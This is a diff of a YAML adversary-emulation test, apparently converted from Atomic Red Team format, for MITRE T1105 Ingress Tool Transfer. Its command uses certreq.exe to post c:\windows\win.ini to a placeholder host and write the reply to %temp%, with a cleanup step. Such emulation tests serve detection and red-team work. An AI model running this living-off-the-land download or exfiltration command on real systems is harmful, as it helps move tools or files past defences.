@@ -1,14 +1,16 @@
-- id: 90a05c74-b062-5e7d-ac3d-b9158c72d46d
+- requirements: []
   name: Soumaia ART Tests - certreq download
   description: Use certreq to download a file from the web
   tactic: command-and-control
-  technique:
-    attack_id: T1105
-    name: Ingress Tool Transfer
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt
-        cleanup: |-
-          del %temp%\Atomic-license.txt >nul 2>&1
+  technique_id: T1105
+  technique_name: Ingress Tool Transfer
+  executors:
+  - cleanup:
+    - del %temp%\Atomic-license.txt >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt
+  id: 90a05c74-b062-5e7d-ac3d-b9158c72d46d
